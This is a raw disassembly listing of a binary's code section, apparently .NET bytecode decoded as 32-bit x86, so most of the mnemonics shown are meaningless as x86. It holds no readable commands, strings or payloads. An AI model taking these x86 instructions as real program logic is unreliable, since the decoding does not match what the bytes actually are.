  4046df:	38 26                	cmp    %ah,(%esi)
  4046e1:	00 00                	add    %al,(%eax)
  4046e3:	00 12                	add    %dl,(%edx)
  4046e5:	03 28                	add    (%eax),%ebp
  4046e7:	bc 00 00 0a 13       	mov    $0x130a0000,%esp
  4046ec:	04 06                	add    $0x6,%al
  4046ee:	17                   	pop    %ss
  4046ef:	58                   	pop    %eax
  4046f0:	0a 08                	or     (%eax),%cl
  4046f2:	11 04 7b             	adc    %eax,(%ebx,%edi,2)
  4046f5:	34 00                	xor    $0x0,%al
  4046f7:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4046fa:	ed                   	in     (%dx),%eax
  4046fb:	00 00                	add    %al,(%eax)
  4046fd:	0a 39                	or     (%ecx),%bh
  4046ff:	07                   	pop    %es
  404700:	00 00                	add    %al,(%eax)
  404702:	00 06                	add    %al,(%esi)
  404704:	0b dd                	or     %ebp,%ebx
  404706:	1c 00                	sbb    $0x0,%al
  404708:	00 00                	add    %al,(%eax)
  40470a:	12 03                	adc    (%ebx),%al
  40470c:	28 be 00 00 0a 2d    	sub    %bh,0x2d0a0000(%esi)
  404712:	d1 dd                	rcr    $1,%ebp
  404714:	0e                   	push   %cs
  404715:	00 00                	add    %al,(%eax)
  404717:	00 12                	add    %dl,(%edx)
  404719:	03 fe                	add    %esi,%edi
  40471b:	16                   	push   %ss
  40471c:	04 00                	add    $0x0,%al
  40471e:	00 1b                	add    %bl,(%ebx)
  404720:	6f                   	outsl  %ds:(%esi),(%dx)
  404721:	33 00                	xor    (%eax),%eax
  404723:	00 0a                	add    %cl,(%edx)
  404725:	dc 07                	faddl  (%edi)
  404727:	2a 01                	sub    (%ecx),%al
  404729:	10 00                	adc    %al,(%eax)
  40472b:	00 02                	add    %al,(%edx)
  40472d:	00 17                	add    %dl,(%edi)
  40472f:	00 39                	add    %bh,(%ecx)
  404731:	50                   	push   %eax
  404732:	00 0e                	add    %cl,(%esi)
  404734:	00 00                	add    %al,(%eax)
  404736:	00 00                	add    %al,(%eax)
  404738:	13 30                	adc    (%eax),%esi
  40473a:	02 00                	add    (%eax),%al
  40473c:	1e                   	push   %ds
  40473d:	00 00                	add    %al,(%eax)
  40473f:	00 01                	add    %al,(%ecx)
  404741:	00 00                	add    %al,(%eax)
  404743:	11 02                	adc    %eax,(%edx)
  404745:	03 28                	add    (%eax),%ebp
  404747:	6d                   	insl   (%dx),%es:(%edi)
  404748:	00 00                	add    %al,(%eax)
  40474a:	06                   	push   %es
  40474b:	0a 06                	or     (%esi),%al
  40474d:	15 40 02 00 00       	adc    $0x240,%eax
  404752:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  404755:	02 7b 38             	add    0x38(%ebx),%bh
  404758:	00 00                	add    %al,(%eax)
  40475a:	04 06                	add    $0x6,%al
  40475c:	6f                   	outsl  %ds:(%esi),(%dx)
  40475d:	ea 00 00 0a 2a 00 00 	ljmp   $0x0,$0x2a0a0000
  404764:	13 30                	adc    (%eax),%esi
  404766:	04 00                	add    $0x0,%al
  404768:	bc 00 00 00 1f       	mov    $0x1f000000,%esp
  40476d:	00 00                	add    %al,(%eax)
  40476f:	11 02                	adc    %eax,(%edx)
  404771:	7b 38                	jnp    0x4047ab
  404773:	00 00                	add    %al,(%eax)
  404775:	04 6f                	add    $0x6f,%al
  404777:	eb 00                	jmp    0x404779
  404779:	00 0a                	add    %cl,(%edx)
  40477b:	0a 06                	or     (%esi),%al
  40477d:	1f                   	pop    %ds
  40477e:	0f 3d                	(bad)
  404780:	16                   	push   %ss
  404781:	00 00                	add    %al,(%eax)
  404783:	00 20                	add    %ah,(%eax)
  404785:	80 00 00             	addb   $0x0,(%eax)
  404788:	00 06                	add    %al,(%esi)
  40478a:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  40478d:	0b 03                	or     (%ebx),%eax
  40478f:	07                   	pop    %es
  404790:	6f                   	outsl  %ds:(%esi),(%dx)
  404791:	ee                   	out    %al,(%dx)
  404792:	00 00                	add    %al,(%eax)
  404794:	0a 38                	or     (%eax),%bh
  404796:	59                   	pop    %ecx
  404797:	00 00                	add    %al,(%eax)
  404799:	00 06                	add    %al,(%esi)
  40479b:	20 ff                	and    %bh,%bh
  40479d:	ff 00                	incl   (%eax)
  40479f:	00 3d 2a 00 00 00    	add    %bh,0x2a
  4047a5:	20 de                	and    %bl,%dh
  4047a7:	00 00                	add    %al,(%eax)
  4047a9:	00 0b                	add    %cl,(%ebx)
  4047ab:	03 07                	add    (%edi),%eax
  4047ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4047ae:	ee                   	out    %al,(%dx)
  4047af:	00 00                	add    %al,(%eax)
  4047b1:	0a 06                	or     (%esi),%al
  4047b3:	68 28 ef 00 00       	push   $0xef28
  4047b8:	0a 28                	or     (%eax),%ch
  4047ba:	58                   	pop    %eax
  4047bb:	00 00                	add    %al,(%eax)
  4047bd:	06                   	push   %es
  4047be:	0c 03                	or     $0x3,%al
  4047c0:	08 16                	or     %dl,(%esi)
  4047c2:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4047c8:	00 0a                	add    %cl,(%edx)
  4047ca:	38 24 00             	cmp    %ah,(%eax,%eax,1)
  4047cd:	00 00                	add    %al,(%eax)
  4047cf:	20 df                	and    %bl,%bh
  4047d1:	00 00                	add    %al,(%eax)
  4047d3:	00 0b                	add    %cl,(%ebx)
  4047d5:	03 07                	add    (%edi),%eax
  4047d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4047d8:	ee                   	out    %al,(%dx)
  4047d9:	00 00                	add    %al,(%eax)
  4047db:	0a 06                	or     (%esi),%al
  4047dd:	28 4a 00             	sub    %cl,0x0(%edx)
  4047e0:	00 0a                	add    %cl,(%edx)
  4047e2:	28 58 00             	sub    %bl,0x0(%eax)
  4047e5:	00 06                	add    %al,(%esi)
  4047e7:	0c 03                	or     $0x3,%al
  4047e9:	08 16                	or     %dl,(%esi)
  4047eb:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4047f1:	00 0a                	add    %cl,(%edx)
  4047f3:	16                   	push   %ss
  4047f4:	0d 38 2d 00 00       	or     $0x2d38,%eax
  4047f9:	00 03                	add    %al,(%ebx)
  4047fb:	02 7b 38             	add    0x38(%ebx),%bh
  4047fe:	00 00                	add    %al,(%eax)
  404800:	04 09                	add    $0x9,%al
  404802:	6f                   	outsl  %ds:(%esi),(%dx)
  404803:	ea 00 00 0a 7b 33 00 	ljmp   $0x33,$0x7b0a0000
  40480a:	00 04 28             	add    %al,(%eax,%ebp,1)
  40480d:	9a 00 00 06 02 7b 38 	lcall  $0x387b,$0x2060000
  404814:	00 00                	add    %al,(%eax)
  404816:	04 09                	add    $0x9,%al
  404818:	6f                   	outsl  %ds:(%esi),(%dx)
  404819:	ea 00 00 0a 03 6f 8a 	ljmp   $0x8a6f,$0x30a0000
  404820:	00 00                	add    %al,(%eax)
  404822:	06                   	push   %es
  404823:	09 17                	or     %edx,(%edi)
  404825:	58                   	pop    %eax
  404826:	0d 09 06 32 cf       	or     $0xcf320609,%eax
  40482b:	2a 13                	sub    (%ebx),%dl
  40482d:	30 04 00             	xor    %al,(%eax,%eax,1)
  404830:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404831:	00 00                	add    %al,(%eax)
  404833:	00 1f                	add    %bl,(%edi)
  404835:	00 00                	add    %al,(%eax)
  404837:	11 02                	adc    %eax,(%edx)
  404839:	7b 38                	jnp    0x404873
  40483b:	00 00                	add    %al,(%eax)
  40483d:	04 6f                	add    $0x6f,%al
  40483f:	eb 00                	jmp    0x404841
  404841:	00 0a                	add    %cl,(%edx)
  404843:	0a 06                	or     (%esi),%al
  404845:	1f                   	pop    %ds
  404846:	0f 3d                	(bad)
  404848:	16                   	push   %ss
  404849:	00 00                	add    %al,(%eax)
  40484b:	00 20                	add    %ah,(%eax)
  40484d:	90                   	nop
  40484e:	00 00                	add    %al,(%eax)
  404850:	00 06                	add    %al,(%esi)
  404852:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  404855:	0b 03                	or     (%ebx),%eax
  404857:	07                   	pop    %es
  404858:	6f                   	outsl  %ds:(%esi),(%dx)
  404859:	ee                   	out    %al,(%dx)
  40485a:	00 00                	add    %al,(%eax)
  40485c:	0a 38                	or     (%eax),%bh
  40485e:	59                   	pop    %ecx
  40485f:	00 00                	add    %al,(%eax)
  404861:	00 06                	add    %al,(%esi)
  404863:	20 ff                	and    %bh,%bh
  404865:	ff 00                	incl   (%eax)
  404867:	00 3d 2a 00 00 00    	add    %bh,0x2a
  40486d:	20 dc                	and    %bl,%ah
  40486f:	00 00                	add    %al,(%eax)
  404871:	00 0b                	add    %cl,(%ebx)
  404873:	03 07                	add    (%edi),%eax
  404875:	6f                   	outsl  %ds:(%esi),(%dx)
  404876:	ee                   	out    %al,(%dx)
  404877:	00 00                	add    %al,(%eax)
  404879:	0a 06                	or     (%esi),%al
  40487b:	68 28 ef 00 00       	push   $0xef28
  404880:	0a 28                	or     (%eax),%ch
  404882:	58                   	pop    %eax
  404883:	00 00                	add    %al,(%eax)
  404885:	06                   	push   %es
  404886:	0c 03                	or     $0x3,%al
  404888:	08 16                	or     %dl,(%esi)
  40488a:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  404890:	00 0a                	add    %cl,(%edx)
  404892:	38 24 00             	cmp    %ah,(%eax,%eax,1)
  404895:	00 00                	add    %al,(%eax)
  404897:	20 dd                	and    %bl,%ch
  404899:	00 00                	add    %al,(%eax)
  40489b:	00 0b                	add    %cl,(%ebx)
  40489d:	03 07                	add    (%edi),%eax
  40489f:	6f                   	outsl  %ds:(%esi),(%dx)
  4048a0:	ee                   	out    %al,(%dx)
  4048a1:	00 00                	add    %al,(%eax)
  4048a3:	0a 06                	or     (%esi),%al
  4048a5:	28 4a 00             	sub    %cl,0x0(%edx)
  4048a8:	00 0a                	add    %cl,(%edx)
  4048aa:	28 58 00             	sub    %bl,0x0(%eax)
  4048ad:	00 06                	add    %al,(%esi)
  4048af:	0c 03                	or     $0x3,%al
  4048b1:	08 16                	or     %dl,(%esi)
  4048b3:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4048b9:	00 0a                	add    %cl,(%edx)
  4048bb:	16                   	push   %ss
  4048bc:	0d 38 16 00 00       	or     $0x1638,%eax
  4048c1:	00 02                	add    %al,(%edx)
  4048c3:	7b 38                	jnp    0x4048fd
  4048c5:	00 00                	add    %al,(%eax)
  4048c7:	04 09                	add    $0x9,%al
  4048c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4048ca:	ea 00 00 0a 03 6f 8a 	ljmp   $0x8a6f,$0x30a0000
  4048d1:	00 00                	add    %al,(%eax)
  4048d3:	06                   	push   %es
  4048d4:	09 17                	or     %edx,(%edi)
  4048d6:	58                   	pop    %eax
  4048d7:	0d 09 06 32 e6       	or     $0xe6320609,%eax
  4048dc:	2a 00                	sub    (%eax),%al
  4048de:	00 00                	add    %al,(%eax)
  4048e0:	13 30                	adc    (%eax),%esi
  4048e2:	02 00                	add    (%eax),%al
  4048e4:	99                   	cltd
  4048e5:	00 00                	add    %al,(%eax)
  4048e7:	00 20                	add    %ah,(%eax)
  4048e9:	00 00                	add    %al,(%eax)
  4048eb:	11 02                	adc    %eax,(%edx)
  4048ed:	7b 36                	jnp    0x404925
  4048ef:	00 00                	add    %al,(%eax)
  4048f1:	04 0a                	add    $0xa,%al
  4048f3:	06                   	push   %es
  4048f4:	1a 59 45             	sbb    0x45(%ecx),%bl
  4048f7:	07                   	pop    %es
  4048f8:	00 00                	add    %al,(%eax)
  4048fa:	00 22                	add    %ah,(%edx)
  4048fc:	00 00                	add    %al,(%eax)
  4048fe:	00 05 00 00 00 16    	add    %al,0x16000000
  404904:	00 00                	add    %al,(%eax)
  404906:	00 6b 00             	add    %ch,0x0(%ebx)
  404909:	00 00                	add    %al,(%eax)
  40490b:	38 00                	cmp    %al,(%eax)
  40490d:	00 00                	add    %al,(%eax)
  40490f:	49                   	dec    %ecx
  404910:	00 00                	add    %al,(%eax)
  404912:	00 5a 00             	add    %bl,0x0(%edx)
  404915:	00 00                	add    %al,(%eax)
  404917:	38 66 00             	cmp    %ah,0x0(%esi)
  40491a:	00 00                	add    %al,(%eax)
  40491c:	02 7b 35             	add    0x35(%ebx),%bh
  40491f:	00 00                	add    %al,(%eax)
  404921:	04 a5                	add    $0xa5,%al
  404923:	68 00 00 01 28       	push   $0x28010000
  404928:	f0 00 00             	lock add %al,(%eax)
  40492b:	0a 2a                	or     (%edx),%ch
  40492d:	02 7b 35             	add    0x35(%ebx),%bh
  404930:	00 00                	add    %al,(%eax)
  404932:	04 a5                	add    $0xa5,%al
  404934:	95                   	xchg   %eax,%ebp
  404935:	00 00                	add    %al,(%eax)
  404937:	01 2a                	add    %ebp,(%edx)
  404939:	02 7b 35             	add    0x35(%ebx),%bh
  40493c:	00 00                	add    %al,(%eax)
  40493e:	04 6f                	add    $0x6f,%al
  404940:	38 00                	cmp    %al,(%eax)
  404942:	00 0a                	add    %cl,(%edx)
  404944:	6f                   	outsl  %ds:(%esi),(%dx)
  404945:	f1                   	int1
  404946:	00 00                	add    %al,(%eax)
  404948:	0a 28                	or     (%eax),%ch
  40494a:	f2 00 00             	repnz add %al,(%eax)
  40494d:	0a 2a                	or     (%edx),%ch
  40494f:	02 7b 35             	add    0x35(%ebx),%bh
  404952:	00 00                	add    %al,(%eax)
  404954:	04 a5                	add    $0xa5,%al
  404956:	96                   	xchg   %eax,%esi
  404957:	00 00                	add    %al,(%eax)
  404959:	01 28                	add    %ebp,(%eax)
  40495b:	f3 00 00             	repz add %al,(%eax)
  40495e:	0a 2a                	or     (%edx),%ch
  404960:	02 7b 35             	add    0x35(%ebx),%bh
  404963:	00 00                	add    %al,(%eax)
  404965:	04 a5                	add    $0xa5,%al
  404967:	97                   	xchg   %eax,%edi
  404968:	00 00                	add    %al,(%eax)
  40496a:	01 28                	add    %ebp,(%eax)
  40496c:	f4                   	hlt
  40496d:	00 00                	add    %al,(%eax)
  40496f:	0a 2a                	or     (%edx),%ch
  404971:	02 7b 35             	add    0x35(%ebx),%bh
  404974:	00 00                	add    %al,(%eax)
  404976:	04 a5                	add    $0xa5,%al
  404978:	6b 00 00             	imul   $0x0,(%eax),%eax
  40497b:	01 28                	add    %ebp,(%eax)
  40497d:	f5                   	cmc
  40497e:	00 00                	add    %al,(%eax)
  404980:	0a 2a                	or     (%edx),%ch
  404982:	16                   	push   %ss
  404983:	6a 2a                	push   $0x2a
  404985:	00 00                	add    %al,(%eax)
  404987:	00 13                	add    %dl,(%ebx)
  404989:	30 02                	xor    %al,(%edx)
  40498b:	00 99 00 00 00 20    	add    %bl,0x20000000(%ecx)
  404991:	00 00                	add    %al,(%eax)
  404993:	11 02                	adc    %eax,(%edx)
  404995:	7b 36                	jnp    0x4049cd
  404997:	00 00                	add    %al,(%eax)
  404999:	04 0a                	add    $0xa,%al
  40499b:	06                   	push   %es
  40499c:	1a 59 45             	sbb    0x45(%ecx),%bl
  40499f:	07                   	pop    %es
  4049a0:	00 00                	add    %al,(%eax)
  4049a2:	00 22                	add    %ah,(%edx)
  4049a4:	00 00                	add    %al,(%eax)
  4049a6:	00 05 00 00 00 11    	add    %al,0x11000000
  4049ac:	00 00                	add    %al,(%eax)
  4049ae:	00 6b 00             	add    %ch,0x0(%ebx)
  4049b1:	00 00                	add    %al,(%eax)
  4049b3:	38 00                	cmp    %al,(%eax)
  4049b5:	00 00                	add    %al,(%eax)
  4049b7:	49                   	dec    %ecx
  4049b8:	00 00                	add    %al,(%eax)
  4049ba:	00 5a 00             	add    %bl,0x0(%edx)
  4049bd:	00 00                	add    %al,(%eax)
  4049bf:	38 66 00             	cmp    %ah,0x0(%esi)
  4049c2:	00 00                	add    %al,(%eax)
  4049c4:	02 7b 35             	add    0x35(%ebx),%bh
  4049c7:	00 00                	add    %al,(%eax)
  4049c9:	04 a5                	add    $0xa5,%al
  4049cb:	68 00 00 01 2a       	push   $0x2a010000
  4049d0:	02 7b 35             	add    0x35(%ebx),%bh
  4049d3:	00 00                	add    %al,(%eax)
  4049d5:	04 a5                	add    $0xa5,%al
  4049d7:	68 00 00 01 28       	push   $0x28010000
  4049dc:	f6 00 00             	testb  $0x0,(%eax)
  4049df:	0a 2a                	or     (%edx),%ch
  4049e1:	02 7b 35             	add    0x35(%ebx),%bh
  4049e4:	00 00                	add    %al,(%eax)
  4049e6:	04 6f                	add    $0x6f,%al
  4049e8:	38 00                	cmp    %al,(%eax)
  4049ea:	00 0a                	add    %cl,(%edx)
  4049ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4049ed:	f1                   	int1
  4049ee:	00 00                	add    %al,(%eax)
  4049f0:	0a 28                	or     (%eax),%ch
  4049f2:	f7 00 00 0a 2a 02    	testl  $0x22a0a00,(%eax)
  4049f8:	7b 35                	jnp    0x404a2f
  4049fa:	00 00                	add    %al,(%eax)
  4049fc:	04 a5                	add    $0xa5,%al
  4049fe:	96                   	xchg   %eax,%esi
  4049ff:	00 00                	add    %al,(%eax)
  404a01:	01 28                	add    %ebp,(%eax)
  404a03:	f8                   	clc
  404a04:	00 00                	add    %al,(%eax)
  404a06:	0a 2a                	or     (%edx),%ch
  404a08:	02 7b 35             	add    0x35(%ebx),%bh
  404a0b:	00 00                	add    %al,(%eax)
  404a0d:	04 a5                	add    $0xa5,%al
  404a0f:	97                   	xchg   %eax,%edi
  404a10:	00 00                	add    %al,(%eax)
  404a12:	01 28                	add    %ebp,(%eax)
  404a14:	f9                   	stc
  404a15:	00 00                	add    %al,(%eax)
  404a17:	0a 2a                	or     (%edx),%ch
  404a19:	02 7b 35             	add    0x35(%ebx),%bh
  404a1c:	00 00                	add    %al,(%eax)
  404a1e:	04 a5                	add    $0xa5,%al
  404a20:	6b 00 00             	imul   $0x0,(%eax),%eax
  404a23:	01 28                	add    %ebp,(%eax)
  404a25:	fa                   	cli
  404a26:	00 00                	add    %al,(%eax)
  404a28:	0a 2a                	or     (%edx),%ch
  404a2a:	16                   	push   %ss
  404a2b:	6a 2a                	push   $0x2a
  404a2d:	00 00                	add    %al,(%eax)
  404a2f:	00 13                	add    %dl,(%ebx)
  404a31:	30 02                	xor    %al,(%edx)
  404a33:	00 87 00 00 00 20    	add    %al,0x20000000(%edi)
  404a39:	00 00                	add    %al,(%eax)
  404a3b:	11 02                	adc    %eax,(%edx)
  404a3d:	7b 36                	jnp    0x404a75
  404a3f:	00 00                	add    %al,(%eax)
  404a41:	04 0a                	add    $0xa,%al
  404a43:	06                   	push   %es
  404a44:	1a 59 45             	sbb    0x45(%ecx),%bl
  404a47:	07                   	pop    %es
  404a48:	00 00                	add    %al,(%eax)
  404a4a:	00 16                	add    %dl,(%esi)
  404a4c:	00 00                	add    %al,(%eax)
  404a4e:	00 05 00 00 00 52    	add    %al,0x52000000
  404a54:	00 00                	add    %al,(%eax)
  404a56:	00 52 00             	add    %dl,0x0(%edx)
  404a59:	00 00                	add    %al,(%eax)
  404a5b:	27                   	daa
  404a5c:	00 00                	add    %al,(%eax)
  404a5e:	00 33                	add    %dh,(%ebx)
  404a60:	00 00                	add    %al,(%eax)
  404a62:	00 40 00             	add    %al,0x0(%eax)
  404a65:	00 00                	add    %al,(%eax)
  404a67:	38 4d 00             	cmp    %cl,0x0(%ebp)
  404a6a:	00 00                	add    %al,(%eax)
  404a6c:	02 7b 35             	add    0x35(%ebx),%bh
  404a6f:	00 00                	add    %al,(%eax)
  404a71:	04 a5                	add    $0xa5,%al
  404a73:	68 00 00 01 28       	push   $0x28010000
  404a78:	fb                   	sti
  404a79:	00 00                	add    %al,(%eax)
  404a7b:	0a 2a                	or     (%edx),%ch
  404a7d:	02 7b 35             	add    0x35(%ebx),%bh
  404a80:	00 00                	add    %al,(%eax)
  404a82:	04 74                	add    $0x74,%al
  404a84:	38 00                	cmp    %al,(%eax)
  404a86:	00 01                	add    %al,(%ecx)
  404a88:	28 fc                	sub    %bh,%ah
  404a8a:	00 00                	add    %al,(%eax)
  404a8c:	0a 2a                	or     (%edx),%ch
  404a8e:	02 7b 35             	add    0x35(%ebx),%bh
  404a91:	00 00                	add    %al,(%eax)
  404a93:	04 a5                	add    $0xa5,%al
  404a95:	96                   	xchg   %eax,%esi
  404a96:	00 00                	add    %al,(%eax)
  404a98:	01 2a                	add    %ebp,(%edx)
  404a9a:	02 7b 35             	add    0x35(%ebx),%bh
  404a9d:	00 00                	add    %al,(%eax)
  404a9f:	04 a5                	add    $0xa5,%al
  404aa1:	97                   	xchg   %eax,%edi
  404aa2:	00 00                	add    %al,(%eax)
  404aa4:	01 6c 2a 02          	add    %ebp,0x2(%edx,%ebp,1)
  404aa8:	7b 35                	jnp    0x404adf
  404aaa:	00 00                	add    %al,(%eax)
  404aac:	04 a5                	add    $0xa5,%al
  404aae:	6b 00 00             	imul   $0x0,(%eax),%eax
  404ab1:	01 28                	add    %ebp,(%eax)
  404ab3:	fa                   	cli
  404ab4:	00 00                	add    %al,(%eax)
  404ab6:	0a 6c 2a 23          	or     0x23(%edx,%ebp,1),%ch
	...
  404ac2:	2a 00                	sub    (%eax),%al
  404ac4:	13 30                	adc    (%eax),%esi
  404ac6:	02 00                	add    (%eax),%al
  404ac8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404ac9:	00 00                	add    %al,(%eax)
  404acb:	00 21                	add    %ah,(%ecx)
  404acd:	00 00                	add    %al,(%eax)
  404acf:	11 02                	adc    %eax,(%edx)
  404ad1:	7b 36                	jnp    0x404b09
  404ad3:	00 00                	add    %al,(%eax)
  404ad5:	04 0a                	add    $0xa,%al
  404ad7:	06                   	push   %es
  404ad8:	1a 59 45             	sbb    0x45(%ecx),%bl
  404adb:	08 00                	or     %al,(%eax)
  404add:	00 00                	add    %al,(%eax)
  404adf:	16                   	push   %ss
  404ae0:	00 00                	add    %al,(%eax)
  404ae2:	00 05 00 00 00 6e    	add    %al,0x6e000000
  404ae8:	00 00                	add    %al,(%eax)
  404aea:	00 6e 00             	add    %ch,0x0(%esi)
  404aed:	00 00                	add    %al,(%eax)
  404aef:	27                   	daa
  404af0:	00 00                	add    %al,(%eax)
  404af2:	00 38                	add    %bh,(%eax)
  404af4:	00 00                	add    %al,(%eax)
  404af6:	00 49 00             	add    %cl,0x0(%ecx)
  404af9:	00 00                	add    %al,(%eax)
  404afb:	62 00                	bound  %eax,(%eax)
  404afd:	00 00                	add    %al,(%eax)
  404aff:	38 69 00             	cmp    %ch,0x0(%ecx)
  404b02:	00 00                	add    %al,(%eax)
  404b04:	02 7b 35             	add    0x35(%ebx),%bh
  404b07:	00 00                	add    %al,(%eax)
  404b09:	04 a5                	add    $0xa5,%al
  404b0b:	68 00 00 01 28       	push   $0x28010000
  404b10:	e7 00                	out    %eax,$0x0
  404b12:	00 0a                	add    %cl,(%edx)
  404b14:	2a 02                	sub    (%edx),%al
  404b16:	7b 35                	jnp    0x404b4d
  404b18:	00 00                	add    %al,(%eax)
  404b1a:	04 6f                	add    $0x6f,%al
  404b1c:	38 00                	cmp    %al,(%eax)
  404b1e:	00 0a                	add    %cl,(%edx)
  404b20:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  404b24:	06                   	push   %es
  404b25:	2a 02                	sub    (%edx),%al
  404b27:	7b 35                	jnp    0x404b5e
  404b29:	00 00                	add    %al,(%eax)
  404b2b:	04 a5                	add    $0xa5,%al
  404b2d:	96                   	xchg   %eax,%esi
  404b2e:	00 00                	add    %al,(%eax)
  404b30:	01 28                	add    %ebp,(%eax)
  404b32:	e8 00 00 0a 2a       	call   0x2a4a4b37
  404b37:	02 7b 35             	add    0x35(%ebx),%bh
  404b3a:	00 00                	add    %al,(%eax)
  404b3c:	04 a5                	add    $0xa5,%al
  404b3e:	97                   	xchg   %eax,%edi
  404b3f:	00 00                	add    %al,(%eax)
  404b41:	01 28                	add    %ebp,(%eax)
  404b43:	fd                   	std
  404b44:	00 00                	add    %al,(%eax)
  404b46:	0a 2a                	or     (%edx),%ch
  404b48:	02 7b 35             	add    0x35(%ebx),%bh
  404b4b:	00 00                	add    %al,(%eax)
  404b4d:	04 a5                	add    $0xa5,%al
  404b4f:	6b 00 00             	imul   $0x0,(%eax),%eax
  404b52:	01 0b                	add    %ecx,(%ebx)
  404b54:	12 01                	adc    (%ecx),%al
  404b56:	28 fe                	sub    %bh,%dh
  404b58:	00 00                	add    %al,(%eax)
  404b5a:	0a 28                	or     (%eax),%ch
  404b5c:	e7 00                	out    %eax,$0x0
  404b5e:	00 0a                	add    %cl,(%edx)
  404b60:	2a 02                	sub    (%edx),%al
  404b62:	7b 35                	jnp    0x404b99
  404b64:	00 00                	add    %al,(%eax)
  404b66:	04 74                	add    $0x74,%al
  404b68:	02 00                	add    (%eax),%al
  404b6a:	00 1b                	add    %bl,(%ebx)
  404b6c:	2a 16                	sub    (%esi),%dl
  404b6e:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404b72:	01 2a                	add    %ebp,(%edx)
  404b74:	13 30                	adc    (%eax),%esi
  404b76:	04 00                	add    $0x0,%al
  404b78:	4b                   	dec    %ebx
  404b79:	00 00                	add    %al,(%eax)
  404b7b:	00 22                	add    %ah,(%edx)
  404b7d:	00 00                	add    %al,(%eax)
  404b7f:	11 03                	adc    %eax,(%ebx)
  404b81:	28 6a 00             	sub    %ch,0x0(%edx)
  404b84:	00 0a                	add    %cl,(%edx)
  404b86:	39 3e                	cmp    %edi,(%esi)
  404b88:	00 00                	add    %al,(%eax)
  404b8a:	00 14 0a             	add    %dl,(%edx,%ecx,1)
  404b8d:	03 19                	add    (%ecx),%ebx
  404b8f:	17                   	pop    %ss
  404b90:	17                   	pop    %ss
  404b91:	73 ff                	jae    0x404b92
  404b93:	00 00                	add    %al,(%eax)
  404b95:	0a 0b                	or     (%ebx),%cl
  404b97:	07                   	pop    %es
  404b98:	6f                   	outsl  %ds:(%esi),(%dx)
  404b99:	e2 00                	loop   0x404b9b
  404b9b:	00 0a                	add    %cl,(%edx)
  404b9d:	d4 8d                	aam    $0x8d
  404b9f:	44                   	inc    %esp
  404ba0:	00 00                	add    %al,(%eax)
  404ba2:	01 0a                	add    %ecx,(%edx)
  404ba4:	07                   	pop    %es
  404ba5:	06                   	push   %es
  404ba6:	16                   	push   %ss
  404ba7:	07                   	pop    %es
  404ba8:	6f                   	outsl  %ds:(%esi),(%dx)
  404ba9:	e2 00                	loop   0x404bab
  404bab:	00 0a                	add    %cl,(%edx)
  404bad:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  404bb4:	07                   	pop    %es
  404bb5:	6f                   	outsl  %ds:(%esi),(%dx)
  404bb6:	9f                   	lahf
  404bb7:	00 00                	add    %al,(%eax)
  404bb9:	0a 07                	or     (%edi),%al
  404bbb:	6f                   	outsl  %ds:(%esi),(%dx)
  404bbc:	40                   	inc    %eax
  404bbd:	00 00                	add    %al,(%eax)
  404bbf:	0a 02                	or     (%edx),%al
  404bc1:	06                   	push   %es
  404bc2:	28 79 00             	sub    %bh,0x0(%ecx)
  404bc5:	00 06                	add    %al,(%esi)
  404bc7:	17                   	pop    %ss
  404bc8:	2a 16                	sub    (%esi),%dl
  404bca:	2a 00                	sub    (%eax),%al
  404bcc:	13 30                	adc    (%eax),%esi
  404bce:	05 00 40 00 00       	add    $0x4000,%eax
  404bd3:	00 00                	add    %al,(%eax)
  404bd5:	00 00                	add    %al,(%eax)
  404bd7:	00 02                	add    %al,(%edx)
  404bd9:	7b 35                	jnp    0x404c10
  404bdb:	00 00                	add    %al,(%eax)
  404bdd:	04 39                	add    $0x39,%al
  404bdf:	33 00                	xor    (%eax),%eax
  404be1:	00 00                	add    %al,(%eax)
  404be3:	03 1c 73             	add    (%ebx,%esi,2),%ebx
  404be6:	6c                   	insb   (%dx),%es:(%edi)
  404be7:	00 00                	add    %al,(%eax)
  404be9:	0a 25 02 7b 35 00    	or     0x357b02,%ah
  404bef:	00 04 74             	add    %al,(%esp,%esi,2)
  404bf2:	02 00                	add    (%eax),%al
  404bf4:	00 1b                	add    %bl,(%ebx)
  404bf6:	16                   	push   %ss
  404bf7:	02 7b 35             	add    0x35(%ebx),%bh
  404bfa:	00 00                	add    %al,(%eax)
  404bfc:	04 74                	add    $0x74,%al
  404bfe:	02 00                	add    (%eax),%al
  404c00:	00 1b                	add    %bl,(%ebx)
  404c02:	8e 69 6f             	mov    0x6f(%ecx),%gs
  404c05:	4c                   	dec    %esp
  404c06:	00 00                	add    %al,(%eax)
  404c08:	0a 25 6f 9f 00 00    	or     0x9f6f,%ah
  404c0e:	0a 6f 40             	or     0x40(%edi),%ch
  404c11:	00 00                	add    %al,(%eax)
  404c13:	0a 17                	or     (%edi),%dl
  404c15:	2a 16                	sub    (%esi),%dl
  404c17:	2a 13                	sub    (%ebx),%dl
  404c19:	30 04 00             	xor    %al,(%eax,%eax,1)
  404c1c:	af                   	scas   %es:(%edi),%eax
  404c1d:	00 00                	add    %al,(%eax)
  404c1f:	00 23                	add    %ah,(%ebx)
  404c21:	00 00                	add    %al,(%eax)
  404c23:	11 02                	adc    %eax,(%edx)
  404c25:	0a 03                	or     (%ebx),%al
  404c27:	6f                   	outsl  %ds:(%esi),(%dx)
  404c28:	f1                   	int1
  404c29:	00 00                	add    %al,(%eax)
  404c2b:	0a 19                	or     (%ecx),%bl
  404c2d:	8d 39                	lea    (%ecx),%edi
  404c2f:	00 00                	add    %al,(%eax)
  404c31:	01 25 d0 47 00 00    	add    %esp,0x47d0
  404c37:	04 28                	add    $0x28,%al
  404c39:	e4 00                	in     $0x0,%al
  404c3b:	00 0a                	add    %cl,(%edx)
